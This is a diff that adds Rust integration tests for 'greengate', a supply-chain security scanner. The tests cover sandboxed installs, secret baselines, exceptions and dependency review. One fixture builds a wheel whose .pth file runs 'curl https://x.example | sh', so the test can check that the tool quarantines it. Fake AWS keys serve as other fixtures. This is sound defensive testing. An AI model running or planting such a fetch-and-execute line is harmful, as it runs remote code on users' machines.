+    for (name, kind) in [("app", "--bin"), ("dep", "--lib")] {
+        let ok = Command::new("cargo")
+            .args(["init", "-q", kind, "--name", name, "--vcs", "none", name])
+            .current_dir(dir.path())
+            .output()
+            .unwrap()
+            .status
+            .success();
+        assert!(ok);
+    }
+    let app = dir.path().join("app");
+    std::fs::write(
+        app.join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    let before = std::fs::read(app.join("Cargo.toml")).unwrap();
+    let out = Command::new(binary())
+        .args([
+            "install",
+            "--plan",
+            "cargo",
+            "add",
+            "--path",
+            "../dep",
+            "--offline",
+        ])
+        .current_dir(&app)
+        .output()
+        .unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert_eq!(
+        std::fs::read(app.join("Cargo.toml")).unwrap(),
+        before,
+        "Cargo.toml restored"
+    );
+    assert!(!app.join("Cargo.lock").exists(), "no lockfile left behind");
+}
+
+// ── greengate install: yarn 1, bun, uv, and legacy routing ────────────────────
+
+#[test]
+fn install_yarn1_isolated_refuses_writes_outside_the_package() {
+    let yarn1 = Command::new("yarn")
+        .arg("--version")
+        .output()
+        .is_ok_and(|o| o.status.success() && o.stdout.starts_with(b"1."));
+    if !yarn1 || !tool_available("npm", &["--version"]) || !tool_available("bwrap", &["--version"])
+    {
+        eprintln!("skipped: needs yarn 1, npm and bubblewrap");
+        return;
+    }
+    let dir = npm_project(&[("victim", "{}"), ("tamper", TAMPER), ("builder", BUILD)]);
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "bwrap", "yarn", "install"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert!(
+        rules_of(&report, "findings").contains(&"INSTALL/BlockedWrite".to_string()),
+        "{report}"
+    );
+    let victim = std::fs::read_to_string(dir.path().join("node_modules/victim/index.js")).unwrap();
+    assert_eq!(victim, "module.exports = \"victim\";\n");
+    assert!(dir.path().join("node_modules/builder/build/out").is_file());
+}
+
+#[test]
+fn install_bun_follows_bun_trust_policy() {
+    if !tool_available("bun", &["--version"]) {
+        eprintln!("skipped: needs bun");
+        return;
+    }
+    // Neither local package is trusted: Bun would run no scripts, so
+    // greengate runs none either.
+    let dir = npm_project(&[("victim", "{}"), ("tamper", TAMPER)]);
+    let (code, report, stderr) = install(dir.path(), &["bun", "install"]);
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    assert_eq!(rules_of(&report, "warnings"), ["INSTALL/BuildNotAllowed"]);
+    assert!(rules_of(&report, "findings").is_empty(), "{report}");
+}
+
+#[test]
+fn install_uv_quarantines_startup_code_before_python_runs() {
+    if !tool_available("uv", &["--version"]) || !tool_available("python3", &["--version"]) {
+        eprintln!("skipped: needs uv and python3");
+        return;
+    }
+    let dir = tempfile::tempdir().unwrap();
+    let links = dir.path().join("wheels");
+    std::fs::create_dir(&links).unwrap();
+    wheel(
+        &links,
+        "badpkg",
+        &[(
+            "badpkg.pth",
+            "import os; os.system('curl https://x.example | sh')\n",
+        )],
+    );
+    std::fs::write(
+        dir.path().join("pyproject.toml"),
+        format!(
+            "[project]\nname = \"app\"\nversion = \"0.1.0\"\nrequires-python = \">=3.8\"\ndependencies = [\"badpkg==1.0\"]\n\
+             [tool.uv]\nno-index = true\nfind-links = [\"{}\"]\npackage = false\n",
+            links.display()
+        ),
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    let (code, report, stderr) = install(dir.path(), &["uv", "sync"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert_eq!(rules_of(&report, "findings"), ["INSTALL/StartupCode"]);
+    let site: Vec<std::path::PathBuf> = std::fs::read_dir(dir.path().join(".venv/lib"))
+        .unwrap()
+        .flatten()
+        .map(|e| e.path().join("site-packages"))
+        .collect();
+    assert!(
+        site.iter().all(|s| !s.join("badpkg.pth").exists()),
+        "the .pth is quarantined"
+    );
+    assert!(
+        site.iter()
+            .any(|s| s.join("badpkg.pth.greengate-blocked").exists())
+    );
+}
+
+#[test]
+fn watch_install_routes_real_package_managers_into_install() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("builder", BUILD)]);
+    let out = Command::new(binary())
+        .args(["watch-install", "npm", "install"])
+        .env("GREENGATE_OSV_URL", quiet_osv())
+        .current_dir(dir.path())
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(out.status.success(), "{stderr}");
+    assert!(
+        stderr.contains("deprecated") && stderr.contains("greengate install npm install"),
+        "{stderr}"
+    );
+    assert!(
+        stderr.contains("install:inspect"),
+        "ran the install flow: {stderr}"
+    );
+}
+
+// ── Baselines, exceptions, --new-since ────────────────────────────────────────
+
+fn report_of(dir: &std::path::Path, args: &[&str]) -> (Option<i32>, serde_json::Value) {
+    let path = dir.join("out.report.json");
+    let out = Command::new(binary())
+        .args(args)
+        .arg("--report")
+        .arg(&path)
+        .current_dir(dir)
+        .output()
+        .unwrap();
+    let report = std::fs::read_to_string(&path)
+        .ok()
+        .and_then(|t| serde_json::from_str(&t).ok())
+        .unwrap_or_else(|| panic!("no report: {}", String::from_utf8_lossy(&out.stderr)));
+    std::fs::remove_file(&path).unwrap();
+    (out.status.code(), report)
+}
+
+fn finding_paths(report: &serde_json::Value, list: &str) -> Vec<String> {
+    report[list]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| {
+            format!(
+                "{}:{}",
+                f["location"]["path"]
+                    .as_str()
+                    .unwrap_or("")
+                    .trim_start_matches("./"),
+                f["location"]["line"]
+            )
+        })
+        .collect()
+}
+
+const KEY_A: &str = "AKIAQWERTYUIOPASDF12";
+const KEY_B: &str = "AKIAPOIUYTREWQLKJH56";
+
+#[test]
+fn baseline_v2_survives_edits_and_catches_new_secrets() {
+    let dir = tempfile::tempdir().unwrap();
+    let app = dir.path().join("app.py");
+    std::fs::write(&app, format!("import os\n\nKEY = \"{KEY_A}\"\n")).unwrap();
+    let (code, _) = report_of(dir.path(), &["scan", "--update-baseline"]);
+    assert_eq!(code, Some(0));
+    let saved = std::fs::read_to_string(dir.path().join(".greengate-baseline.json")).unwrap();
+    assert!(saved.contains("\"version\": 2") && saved.contains("gg1:"));
+    assert!(
+        !saved.contains("AKIA"),
+        "the baseline must not hold the secret"
+    );
+
+    // Code inserted above the known secret: still known.
+    std::fs::write(
+        &app,
+        format!("\"\"\"Docs.\"\"\"\nimport os\nimport sys\n\nKEY = \"{KEY_A}\"\n"),
+    )
+    .unwrap();
+    let (code, report) = report_of(dir.path(), &["scan", "--since-baseline"]);
+    assert_eq!(code, Some(0), "{report}");
+    assert_eq!(report["suppressed"][0]["suppression"]["kind"], "baseline");
+
+    // A second secret is new.
+    std::fs::write(
+        &app,
+        format!("import os\n\nKEY = \"{KEY_A}\"\nOTHER = \"{KEY_B}\"\n"),
+    )
+    .unwrap();
+    let (code, report) = report_of(dir.path(), &["scan", "--since-baseline"]);
+    assert_eq!(code, Some(1));
+    assert_eq!(finding_paths(&report, "findings"), ["app.py:4"]);
+    assert!(
+        report["findings"][0]["fingerprint"]
+            .as_str()
+            .is_some_and(|f| f.starts_with("gg1:"))
+    );
+}
+
+#[test]
+fn baseline_v2_follows_a_moved_file() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("a.py"), format!("KEY = \"{KEY_A}\"\n")).unwrap();
+    report_of(dir.path(), &["scan", "--update-baseline"]);
+    std::fs::create_dir(dir.path().join("pkg")).unwrap();
+    std::fs::rename(dir.path().join("a.py"), dir.path().join("pkg/b.py")).unwrap();
+    let (code, report) = report_of(dir.path(), &["scan", "--since-baseline"]);
+    assert_eq!(code, Some(0), "{report}");
+    assert!(
+        report["suppressed"][0]["suppression"]["reason"]
+            .as_str()
+            .unwrap()
+            .contains("moved")
+    );
+}
+
+#[test]
+fn baseline_v1_still_works_and_migrates() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("a.py"), format!("KEY = \"{KEY_A}\"\n")).unwrap();
+    std::fs::write(
+        dir.path().join(".greengate-baseline.json"),
+        r#"[{"path":"./a.py","rule_id":"AWS Access Key","line":1},{"path":"./gone.py","rule_id":"AWS Access Key","line":1}]"#,
+    )
+    .unwrap();
+    let out = run_in(dir.path(), &["scan", "--since-baseline"]);
+    assert_eq!(out.status.code(), Some(0));
+    assert!(String::from_utf8_lossy(&out.stderr).contains("greengate baseline migrate"));
+
+    let out = run_in(dir.path(), &["baseline", "migrate"]);
+    assert_eq!(out.status.code(), Some(0));
+    assert!(String::from_utf8_lossy(&out.stdout).contains("1 of 2 entries"));
+    let v2: serde_json::Value = serde_json::from_str(
+        &std::fs::read_to_string(dir.path().join(".greengate-baseline.json")).unwrap(),
+    )
+    .unwrap();
+    assert_eq!(v2["version"], 2);
+    assert_eq!(v2["entries"].as_array().unwrap().len(), 1);
+    let (code, _) = report_of(dir.path(), &["scan", "--since-baseline"]);
+    assert_eq!(code, Some(0));
+    // Running it again changes nothing.
+    assert_eq!(
+        run_in(dir.path(), &["baseline", "migrate"]).status.code(),
+        Some(0)
+    );
+}
+
+#[test]
+fn baselines_for_different_gates_share_one_file() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("a.py"), format!("KEY = \"{KEY_A}\"\n")).unwrap();
+    let wf = dir.path().join(".github/workflows");
+    std::fs::create_dir_all(&wf).unwrap();
+    std::fs::write(
+        wf.join("ci.yml"),
+        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n",
+    )
+    .unwrap();
+    report_of(dir.path(), &["scan", "--update-baseline"]);
+    report_of(dir.path(), &["ci-lint", "--update-baseline"]);
+    let (code, _) = report_of(dir.path(), &["scan", "--since-baseline"]);
+    assert_eq!(code, Some(0), "ci-lint's update kept scan's entries");
+    std::fs::write(
+        wf.join("ci.yml"),
+        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/cache@v4\n",
+    )
+    .unwrap();
+    let (code, report) = report_of(dir.path(), &["ci-lint", "--since-baseline"]);
+    assert_eq!(code, Some(1));
+    assert_eq!(
+        finding_paths(&report, "findings"),
+        [".github/workflows/ci.yml:7"]
+    );
+}
+
+#[test]
+fn scan_new_since_reports_only_new_findings() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    init_git_repo(d);
+    std::fs::write(
+        d.join("old.py"),
+        format!("import os\n\nKEY = \"{KEY_A}\"\n"),
+    )
+    .unwrap();
+    std::fs::write(d.join("other.py"), "x = 1\n").unwrap();
+    git_commit_all(d, "base");
+    Command::new("git")
+        .args(["checkout", "-qb", "feature"])
+        .current_dir(d)
+        .output()
+        .unwrap();
+    // Renamed and edited, committed: the old secret is not new.
+    std::fs::remove_file(d.join("old.py")).unwrap();
+    std::fs::write(
+        d.join("renamed.py"),
+        format!("\"\"\"Moved.\"\"\"\nimport os\nimport sys\n\nKEY = \"{KEY_A}\"\n"),
+    )
+    .unwrap();
+    git_commit_all(d, "rename");
+    // Uncommitted and untracked secrets are.
+    std::fs::write(d.join("other.py"), format!("x = 1\nT = \"{KEY_B}\"\n")).unwrap();
+    std::fs::write(d.join("new.py"), "N = \"AKIAMNBVCXZLKJHGFD78\"\n").unwrap();
+
+    let (code, report) = report_of(d, &["scan", "--new-since", "main"]);
+    assert_eq!(code, Some(1), "{report}");
+    let mut found = finding_paths(&report, "findings");
+    found.sort();
+    assert_eq!(found, ["new.py:1", "other.py:2"]);
+    assert_eq!(finding_paths(&report, "suppressed"), ["renamed.py:5"]);
+
+    // Without a ref, outside a pull request: a usage error.
+    let out = Command::new(binary())
+        .args(["scan", "--new-since"])
+        .env_remove("GITHUB_BASE_REF")
+        .current_dir(d)
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(2));
+}
+
+#[test]
+fn pipeline_scan_step_honours_new_since() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    init_git_repo(d);
+    std::fs::write(d.join("old.py"), format!("KEY = \"{KEY_A}\"\n")).unwrap();
+    std::fs::write(
+        d.join(".greengate.toml"),
+        "[pipeline]\nsteps = [\"scan --new-since HEAD\"]\n",
+    )
+    .unwrap();
+    git_commit_all(d, "base");
+
+    // The existing finding is not new: the step passes, as `scan` does.
+    let (code, report) = report_of(d, &["scan", "--new-since", "HEAD"]);
+    assert_eq!(code, Some(0), "{report}");
+    let (code, report) = report_of(d, &["run"]);
+    assert_eq!(code, Some(0), "{report}");
+
+    // A new one fails both.
+    std::fs::write(d.join("new.py"), "N = \"AKIAMNBVCXZLKJHGFD78\"\n").unwrap();
+    let (code, report) = report_of(d, &["run"]);
+    assert_eq!(code, Some(1), "{report}");
+    assert_eq!(finding_paths(&report, "findings"), ["new.py:1"]);
+}
+
+#[test]
+fn removed_lighthouse_and_reassure_config_still_loads() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[lighthouse]\nurl = \"https://example.com\"\n\n[reassure]\nthreshold = 15\n\n\
+         [pipeline]\nsteps = [\"scan\", \"lighthouse\"]\n",
+    )
+    .unwrap();
+    // A 0.3 config still loads; the removed sections are only warned about.
+    let out = Command::new(binary())
+        .arg("scan")
+        .current_dir(dir.path())
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(0));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("[lighthouse] in .greengate.toml is ignored"),
+        "{stderr}"
+    );
+    assert!(
+        stderr.contains("[reassure] in .greengate.toml is ignored"),
+        "{stderr}"
+    );
+
+    // The removed step says so instead of passing or being "unknown".
+    let out = Command::new(binary())
+        .arg("run")
+        .current_dir(dir.path())
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(4));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("'lighthouse' step was removed in greengate 0.4"),
+        "{stderr}"
+    );
+}
+
+#[test]
+fn pipeline_step_with_unknown_flag_fails() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[pipeline]\nsteps = [\"scan --new-sinse HEAD\"]\n",
+    )
+    .unwrap();
+    let output = Command::new(binary())
+        .arg("run")
+        .current_dir(dir.path())
+        .output()
+        .unwrap();
+    assert_eq!(output.status.code(), Some(4));
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.contains("does not take '--new-sinse'"),
+        "stderr: {stderr}"
+    );
+}
+
+#[test]
+fn scan_changed_since_replaces_since() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    init_git_repo(d);
+    std::fs::write(d.join("a.py"), "x = 1\n").unwrap();
+    git_commit_all(d, "base");
+    std::fs::write(d.join("a.py"), format!("K = \"{KEY_A}\"\n")).unwrap();
+    assert_eq!(
+        run_in(d, &["scan", "--changed-since", "HEAD"])
+            .status
+            .code(),
+        Some(1)
+    );
+    let old = run_in(d, &["scan", "--since", "HEAD"]);
+    assert_eq!(old.status.code(), Some(1));
+    assert!(String::from_utf8_lossy(&old.stderr).contains("--since is deprecated"));
+}
+
+fn write_exceptions(dir: &std::path::Path, body: &str) {
+    std::fs::create_dir_all(dir.join(".greengate")).unwrap();
+    std::fs::write(dir.join(".greengate/exceptions.toml"), body).unwrap();
+}
+
+/// `days` from today, as YYYY-MM-DD (UTC).
+fn date_in(days: i64) -> String {
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs() as i64;
+    // civil_from_days (Howard Hinnant).
+    let z = now / 86_400 + days + 719_468;
+    let era = z.div_euclid(146_097);
+    let doe = z - era * 146_097;
+    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = doy - (153 * mp + 2) / 5 + 1;
+    let m = if mp < 10 { mp + 3 } else { mp - 9 };
+    let y = yoe + era * 400 + i64::from(m <= 2);
+    format!("{y:04}-{m:02}-{d:02}")
+}
+
+#[test]
+fn exceptions_waive_findings_until_they_expire() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    std::fs::write(d.join("fixture.py"), format!("K = \"{KEY_A}\"\n")).unwrap();
+    std::fs::write(d.join("legacy.py"), format!("K = \"{KEY_B}\"\n")).unwrap();
+    write_exceptions(
+        d,
+        &format!(
+            r#"
+[[exception]]
+id = "EX-1"
+match = {{ rule = "AWS Access Key", path = "fixture.py" }}
+reason = "test fixture"
+owner = "@sec"
+expires = "{}"
+
+[[exception]]
+id = "EX-2"
+match = {{ rule = "AWS Access Key", path = "legacy.py" }}
+reason = "legacy"
+owner = "@legacy"
+expires = "{}"
+"#,
+            date_in(5),
+            date_in(-1)
+        ),
+    );
+    let (code, report) = report_of(d, &["scan"]);
+    assert_eq!(code, Some(1), "{report}");
+    assert_eq!(finding_paths(&report, "findings"), ["legacy.py:1"]);
+    let reactivated = &report["findings"][0];
+    assert!(
+        reactivated["message"]
+            .as_str()
+            .unwrap()
+            .contains("exception EX-2 expired")
+    );
+    assert_eq!(reactivated["suppression"]["owner"], "@legacy");
+    let waived = &report["suppressed"][0]["suppression"];
+    assert_eq!(waived["kind"], "exception");
+    assert_eq!(waived["id"], "EX-1");
+    assert_eq!(waived["reason"], "test fixture");
+    assert_eq!(report["warnings"][0]["rule"], "EXCEPTION/ExpiresSoon");
+}
+
+#[test]
+fn invalid_exceptions_are_a_usage_error() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    write_exceptions(
+        d,
+        &format!(
+            "[[exception]]\nid = \"EX-1\"\nmatch = {{ rule = \"R\" }}\nreason = \"r\"\nowner = \"o\"\nexpires = \"{}\"\n",
+            date_in(400)
+        ),
+    );
+    for args in [&["scan"][..], &["ci-lint"], &["check-config"]] {
+        let out = run_in(d, args);
+        assert_eq!(out.status.code(), Some(2), "{args:?}");
+        assert!(String::from_utf8_lossy(&out.stderr).contains("max_exception_days"));
+    }
+    // A longer limit makes it valid.
+    std::fs::write(
+        d.join(".greengate.toml"),
+        "[policy]\nmax_exception_days = 500\n",
+    )
+    .unwrap();
+    assert_eq!(run_in(d, &["check-config"]).status.code(), Some(0));
+}
+
+#[test]
+fn inline_ignore_reasons_are_listed() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join("a.py"),
+        format!(
+            "A = \"{KEY_A}\"  # greengate: ignore reason=\"rotated test key\"\n# greengate: ignore — docs example\nB = \"{KEY_B}\"\n"
+        ),
+    )
+    .unwrap();
+    let (code, report) = report_of(dir.path(), &["scan"]);
+    assert_eq!(code, Some(0), "{report}");
+    let reasons: Vec<&str> = report["suppressed"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["suppression"]["reason"].as_str().unwrap())
+        .collect();
+    assert_eq!(reasons, ["rotated test key", "docs example"]);
+}
+
+#[test]
+fn audit_exceptions_and_deprecated_ignore_advisories() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    write_lodash_lock(d);
+    let osv = fake_osv(
+        r#"{"results":[{"vulns":[{"id":"GHSA-test-0001"},{"id":"GHSA-test-0002"},{"id":"GHSA-test-0003"}]}]}"#,
+    );
+    write_exceptions(
+        d,
+        &format!(
+            "[[exception]]\nid = \"EX-7\"\nmatch = {{ advisory = \"GHSA-test-0001\", package = \"lodash\" }}\nreason = \"not reachable\"\nowner = \"@web\"\nexpires = \"{}\"\nticket = \"SEC-1\"\n",
+            date_in(30)
+        ),
+    );
+    std::fs::write(
+        d.join(".greengate.toml"),
+        "[audit]\nignore_advisories = [\"GHSA-test-0002\"]\n",
+    )
+    .unwrap();
+    let (code, report) = audit_json(d, &osv, &[]);
+    assert_eq!(code, Some(1), "{report}");
+    let rules: Vec<&str> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["rule"].as_str().unwrap())
+        .collect();
+    assert_eq!(rules, ["OSV/GHSA-test-0003"]);
+    let kinds: Vec<(&str, &str)> = report["suppressed"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| {
+            (
+                f["rule"].as_str().unwrap(),
+                f["suppression"]["kind"].as_str().unwrap(),
+            )
+        })
+        .collect();
+    assert!(kinds.contains(&("OSV/GHSA-test-0001", "exception")));
+    assert!(kinds.contains(&("OSV/GHSA-test-0002", "config")));
+
+    // `exceptions migrate` moves the config list into the exceptions file.
+    let out = Command::new(binary())
+        .args(["exceptions", "migrate", "--owner", "@platform"])
+        .current_dir(d)
+        .output()
+        .unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let file = std::fs::read_to_string(d.join(".greengate/exceptions.toml")).unwrap();
+    assert!(file.contains("advisory = \"GHSA-test-0002\"") && file.contains("@platform"));
+    std::fs::write(d.join(".greengate.toml"), "").unwrap();
+    let (_, report) = audit_json(d, &osv, &[]);
+    assert_eq!(report["suppressed"].as_array().unwrap().len(), 2);
+}
+
+#[test]
+fn audit_baseline_ignores_version_bumps() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    write_lodash_lock(d);
+    let osv = fake_osv(r#"{"results":[{"vulns":[{"id":"GHSA-test-0001"}]}]}"#);
+    let (code, _) = audit_json(d, &osv, &["--update-baseline"]);
+    assert_eq!(code, Some(0));
+    // Still affected after a patch upgrade: the same known problem.
+    std::fs::write(
+        d.join("package-lock.json"),
+        r#"{"packages": {"node_modules/lodash": {"version": "4.17.21"}}}"#,
+    )
+    .unwrap();
+    let (code, report) = audit_json(d, &osv, &["--since-baseline"]);
+    assert_eq!(code, Some(0), "{report}");
+    assert_eq!(report["suppressed"][0]["suppression"]["kind"], "baseline");
+}
+
+#[test]
+fn ci_lint_honours_inline_ignore() {
+    let dir = tempfile::tempdir().unwrap();
+    let wf = dir.path().join(".github/workflows");
+    std::fs::create_dir_all(&wf).unwrap();
+    std::fs::write(
+        wf.join("ci.yml"),
+        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      # greengate: ignore reason=\"our own action\"\n      - uses: org/internal@v1\n      - uses: actions/checkout@v4\n",
+    )
+    .unwrap();
+    let (code, report) = report_of(dir.path(), &["ci-lint"]);
+    assert_eq!(code, Some(1));
+    assert_eq!(
+        finding_paths(&report, "findings"),
+        [".github/workflows/ci.yml:8"]
+    );
+    assert_eq!(
+        report["suppressed"][0]["suppression"]["reason"],
+        "our own action"
+    );
+}
+
+// ── deps review ───────────────────────────────────────────────────────────────
+
+type HttpLog = std::sync::Arc<std::sync::Mutex<Vec<(String, String, String)>>>;
+
+/// A fake HTTP server: `respond(method, path, body)` answers every request,
+/// and each request is logged.
+fn fake_http(respond: fn(&str, &str, &str) -> (u16, String)) -> (String, HttpLog) {
+    use std::io::{BufRead, BufReader, Read, Write};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let addr = listener.local_addr().unwrap();
+    let log: HttpLog = Default::default();
+    let seen = log.clone();
+    std::thread::spawn(move || {
+        for stream in listener.incoming() {
+            let Ok(mut stream) = stream else { continue };
+            let mut reader = BufReader::new(stream.try_clone().unwrap());
+            let mut request = String::new();
+            reader.read_line(&mut request).unwrap_or(0);
+            let mut len = 0;
+            loop {
+                let mut h = String::new();
+                if reader.read_line(&mut h).unwrap_or(0) == 0 || h.trim().is_empty() {
+                    break;
+                }
+                if let Some(v) = h.to_ascii_lowercase().strip_prefix("content-length:") {
+                    len = v.trim().parse().unwrap_or(0);
+                }
+            }
+            let mut body = vec![0; len];
+            let _ = reader.read_exact(&mut body);
+            let body = String::from_utf8_lossy(&body).into_owned();
+            let mut parts = request.split_whitespace();
+            let method = parts.next().unwrap_or("").to_string();
+            let path = parts.next().unwrap_or("").to_string();
+            seen.lock()
+                .unwrap()
+                .push((method.clone(), path.clone(), body.clone()));
+            let (status, out) = respond(&method, &path, &body);
+            let _ = write!(
+                stream,
+                "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{out}",
+                out.len()
+            );
+        }
+    });
+    (format!("http://{addr}"), log)
+}
+
+/// OSV: lodash 4.17.20 has one advisory, fixed in 4.17.21.
+fn review_osv(method: &str, path: &str, body: &str) -> (u16, String) {
+    if method == "POST" && path == "/v1/querybatch" {
+        let q: serde_json::Value = serde_json::from_str(body).unwrap();
+        let results: Vec<serde_json::Value> = q["queries"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|q| {
+                if q["package"]["name"] == "lodash" && q["version"] == "4.17.20" {
+                    serde_json::json!({"vulns": [{"id": "GHSA-test-lodash"}]})
+                } else {
+                    serde_json::json!({})
+                }
+            })
+            .collect();
+        return (200, serde_json::json!({ "results": results }).to_string());
+    }
+    if path == "/v1/vulns/GHSA-test-lodash" {
+        return (
+            200,
+            serde_json::json!({
+                "id": "GHSA-test-lodash",
+                "summary": "Prototype pollution in lodash",
+                "database_specific": {"severity": "HIGH"},
+                "affected": [{
+                    "package": {"ecosystem": "npm", "name": "lodash"},
+                    "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}, {"fixed": "4.17.21"}]}]
+                }]
+            })
+            .to_string(),
+        );
+    }
+    (404, "{}".into())
+}
+
+/// npm: lodash (MIT) and copyleft (AGPL), both old releases.
+fn review_registry(_: &str, path: &str, _: &str) -> (u16, String) {
+    let doc = |license: &str, versions: &[&str]| {
+        let mut time = serde_json::Map::new();
+        let mut vs = serde_json::Map::new();
+        for v in versions {
+            time.insert(v.to_string(), serde_json::json!("2020-01-01T00:00:00.000Z"));
+            vs.insert(
+                v.to_string(),
+                serde_json::json!({"license": license, "_npmUser": {"name": "maint"}}),
+            );
+        }
+        serde_json::json!({"time": time, "versions": vs}).to_string()
+    };
+    match path {
+        "/lodash" => (200, doc("MIT", &["4.17.20", "4.17.21"])),
+        "/copyleft" => (200, doc("AGPL-3.0-only", &["1.0.0"])),
+        _ => (404, "{}".into()),
+    }
+}
+
+fn lock_v3(deps: &[(&str, &str)]) -> String {
+    let mut packages = serde_json::Map::new();
+    let root_deps: serde_json::Map<String, serde_json::Value> = deps
+        .iter()
+        .map(|(n, v)| (n.to_string(), serde_json::json!(v)))
+        .collect();
+    packages.insert(
+        String::new(),
+        serde_json::json!({"name": "app", "version": "1.0.0", "dependencies": root_deps}),
+    );
+    for (n, v) in deps {
+        packages.insert(
+            format!("node_modules/{n}"),
+            serde_json::json!({
+                "version": v,
+                "resolved": format!("https://registry.npmjs.org/{n}/-/{n}-{v}.tgz"),
+                "integrity": "sha512-x"
+            }),
+        );
+    }
+    serde_json::to_string_pretty(&serde_json::json!({
+        "name": "app", "version": "1.0.0", "lockfileVersion": 3, "packages": packages
+    }))
+    .unwrap()
+}
+
+/// A repository whose `main` has no dependencies and whose working tree
+/// adds lodash 4.17.20 (pinned) and copyleft 1.0.0.
+fn review_repo(dir: &std::path::Path) {
+    init_git_repo(dir);
+    std::fs::write(
+        dir.join("package.json"),
+        r#"{"name":"app","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    std::fs::write(dir.join("package-lock.json"), lock_v3(&[])).unwrap();
+    git_commit_all(dir, "base");
+    std::fs::write(
+        dir.join("package.json"),
+        r#"{"name":"app","version":"1.0.0","dependencies":{"lodash":"4.17.20","copyleft":"^1.0.0"}}"#,
+    )
+    .unwrap();
+    std::fs::write(
+        dir.join("package-lock.json"),
+        lock_v3(&[("lodash", "4.17.20"), ("copyleft", "1.0.0")]),
+    )
+    .unwrap();
+    std::fs::write(
+        dir.join(".greengate.toml"),
+        "[dependency_review]\ndeny_licenses = [\"AGPL-3.0-only\"]\n",
+    )
+    .unwrap();
+}
+
+fn review_cmd(dir: &std::path::Path, osv: &str, npm: &str) -> Command {
+    let mut c = Command::new(binary());
+    c.args(["deps", "review", "--base", "main"])
+        .current_dir(dir)
+        .env("GREENGATE_OSV_URL", osv)
+        .env("GREENGATE_NPM_REGISTRY", npm)
+        .env("GREENGATE_CACHE_DIR", dir.join(".cache"))
+        .env_remove("GITHUB_BASE_REF");
+    c
+}
+
+#[test]
+fn deps_review_reports_advisories_licenses_and_fixes() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    review_repo(d);
+    let (osv, _) = fake_http(review_osv);
+    let (npm, _) = fake_http(review_registry);
+    let out = review_cmd(d, &osv, &npm)
+        .args(["--format", "json"])
+        .output()
+        .unwrap();
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let doc: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
+    assert_eq!(doc["schema"], "greengate.deps-review/v1");
+    let changes = doc["changes"].as_array().unwrap();
+    let lodash = changes.iter().find(|c| c["name"] == "lodash").unwrap();
+    assert_eq!(lodash["kind"], "added");
+    assert_eq!(lodash["direct"], true);
+    assert_eq!(lodash["license"], "MIT");
+    assert_eq!(lodash["introduced"][0]["id"], "GHSA-test-lodash");
+    assert_eq!(lodash["fix"]["fixed_in"], "4.17.21");
+    // Pinned in package.json: the project's own requirement must move.
+    assert_eq!(lodash["fix"]["steps"][0]["kind"], "raise_requirement");
+    assert_eq!(
+        lodash["fix"]["steps"][0]["command"],
+        "npm install lodash@^4.17.21"
+    );
+    let rules: Vec<&str> = doc["report"]["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
